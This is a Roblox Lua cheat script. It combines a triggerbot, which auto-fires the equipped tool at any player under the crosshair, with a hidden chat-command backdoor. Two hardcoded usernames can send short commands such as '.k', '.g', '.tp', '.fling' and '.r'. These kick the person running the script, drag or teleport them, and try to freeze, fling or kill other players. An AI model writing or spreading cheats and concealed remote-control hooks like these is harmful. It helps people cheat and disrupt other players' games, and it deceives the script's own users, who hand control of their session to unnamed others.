-- Triggerbot + VIP commands + bubble chat

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Camera = workspace.CurrentCamera

local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()

-- SETTINGS
local VIPUsers = { "draconvm", "K3TCHUPSS" }
local BringTargets = {}
local FrozenPlayers = {}
local Settings = {
    Enabled = false,
    ToggleKey = Enum.KeyCode.Q,
    MaxDistance = 1000,
    BlacklistedTools = { "Knife" },
    SpamPerSecond = 600
}

local BlacklistedTools = {}
for _, name in ipairs(Settings.BlacklistedTools) do
    BlacklistedTools[name] = true
end

-- HELPERS
local function isAlive(character)
    local hum = character and character:FindFirstChildOfClass("Humanoid")
    return hum and hum.Health > 0
end

local function getUsableTool(character)
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") and not BlacklistedTools[tool.Name] then
            return tool
        end
    end
end

local function getDistance(a, b)
    local rootA = a:FindFirstChild("HumanoidRootPart") or a:FindFirstChild("Head")
    local rootB = b:FindFirstChild("HumanoidRootPart") or b:FindFirstChild("Head")
    if not rootA or not rootB then return math.huge end
    return (rootA.Position - rootB.Position).Magnitude
end

local function hasLineOfSight(targetChar)
    local camPos = Camera.CFrame.Position
    local targetRoot = targetChar and (targetChar:FindFirstChild("Head") or targetChar:FindFirstChild("HumanoidRootPart"))
    if not targetRoot then return false end
    local params = RaycastParams.new()
    params.FilterType = Enum.RaycastFilterType.Blacklist
    params.FilterDescendantsInstances = { LocalPlayer.Character }
    local result = workspace:Raycast(camPos, (targetRoot.Position - camPos), params)
    return not (result and result.Instance and not result.Instance:IsDescendantOf(targetChar))
end

local function getCrosshairTarget()
    local targetPart = Mouse.Target
    if not targetPart then return end
    local char = targetPart:FindFirstAncestorOfClass("Model")
    if not char or not isAlive(char) then return end
    local player = Players:GetPlayerFromCharacter(char)
    if not player or player == LocalPlayer then return end
    if getDistance(LocalPlayer.Character, char) > Settings.MaxDistance then return end
    if not hasLineOfSight(char) then return end
    return char
end

-- TRIGGERBOT
RunService.RenderStepped:Connect(function(dt)
    if not Settings.Enabled then return end
    local myChar = LocalPlayer.Character
    if not myChar or not isAlive(myChar) then return end
    local tool = getUsableTool(myChar)
    if not tool then return end
    local target = getCrosshairTarget()
    if target then
        if tool and tool.Parent ~= myChar then
            myChar:FindFirstChildOfClass("Humanoid"):EquipTool(tool)
        end
        local spamRate = math.max(1, math.floor(Settings.SpamPerSecond * dt))
        for i = 1, spamRate do
            task.defer(function()
                if tool and tool.Activate then
                    tool:Activate()
                end
            end)
        end
    end
end)

-- TOGGLE TRIGGERBOT
UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Settings.ToggleKey then
        Settings.Enabled = not Settings.Enabled
    end
end)

-- SMOOTH BRING LOOP
RunService.RenderStepped:Connect(function()
    for targetName, _ in pairs(BringTargets) do
        local targetPlayer = Players:FindFirstChild(targetName)
        for _, vipName in ipairs(VIPUsers) do
            local vipPlayer = Players:FindFirstChild(vipName)
            if vipPlayer and vipPlayer.Character and targetPlayer and targetPlayer.Character and targetPlayer ~= vipPlayer then
                local vipRoot = vipPlayer.Character:FindFirstChild("HumanoidRootPart")
                local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
                if vipRoot and targetRoot then
                    local direction = (vipRoot.Position + Vector3.new(0,3,0) - targetRoot.Position)
                    targetRoot.CFrame = targetRoot.CFrame + direction * 0.25
                end
            end
        end
    end
end)

-- FLING FUNCTION (STRONG)
local function flingPlayer(player)
    if player.Character then
        local root = player.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local bodyVelocity = Instance.new("BodyVelocity")
            bodyVelocity.Velocity = Vector3.new(math.random(-1500,1500), 800, math.random(-1500,1500))
            bodyVelocity.MaxForce = Vector3.new(1e6,1e6,1e6)
            bodyVelocity.P = 1e5
            bodyVelocity.Parent = root
            task.delay(0.3, function() bodyVelocity:Destroy() end)
        end
    end
end

-- TP AND FREEZE ALL
local function teleportToPlayer(targetName)
    local targetPlayer = Players:FindFirstChild(targetName)
    local myChar = LocalPlayer.Character
    if targetPlayer and targetPlayer.Character and myChar then
        local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
        local myRoot = myChar:FindFirstChild("HumanoidRootPart")
        if targetRoot and myRoot then
            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0,3,0)
        end
    end
end

local function freezeAllPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Name ~= senderName and not FrozenPlayers[player.Name] then
            local root = player.Character:FindFirstChild("HumanoidRootPart")
            if root then
                root.Anchored = true
                FrozenPlayers[player.Name] = true
            end
        end
    end
end

local function unfreezeAllPlayers(senderName)
    for name, _ in pairs(FrozenPlayers) do
        if name ~= senderName then
            local player = Players:FindFirstChild(name)
            if player and player.Character then
                local root = player.Character:FindFirstChild("HumanoidRootPart")
                if root then
                    root.Anchored = false
                end
            end
            FrozenPlayers[name] = nil
        end
    end
end

local function killAllOtherPlayers(senderName)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name ~= senderName then
            local hum = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            if hum then
                hum.Health = 0
            end
        end
    end
end

-- CHAT COMMAND HANDLER
local function onMessage(senderName, message)
    local isVIP = false
    for _, vipName in ipairs(VIPUsers) do
        if senderName:lower() == vipName:lower() then
            isVIP = true
            break
        end
    end
    if not isVIP then return end

    local args = message:split(" ")
    local msg = args[1]:lower()

    if msg == ".k" and LocalPlayer.Name:lower() ~= senderName:lower() then
        LocalPlayer:Kick("Kicked by VIP")
    end

    if msg == ".g" then
        if LocalPlayer.Name ~= senderName then
            BringTargets[LocalPlayer.Name] = true
        end
    end

    if msg == ".s" then
        BringTargets[LocalPlayer.Name] = nil
    end

    if msg == ".f" then
        freezeAllPlayers(senderName)
    end

    if msg == ".u" then
        unfreezeAllPlayers(senderName)
    end

    if msg == ".tp" and args[2] then
        if LocalPlayer.Name ~= senderName then
            teleportToPlayer(args[2])
        end
    end

    if msg == ".fling" then
        for _, player in ipairs(Players:GetPlayers()) do
            if player.Name ~= senderName then
                flingPlayer(player)
            end
        end
    end

    if msg == ".r" then
        if LocalPlayer.Name ~= senderName then
            killAllOtherPlayers(senderName)
        end
    end
end

-- CHAT HOOKS
local function hookPlayer(plr)
    plr.Chatted:Connect(function(msg)
        onMessage(plr.Name, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
Players.PlayerAdded:Connect(hookPlayer)
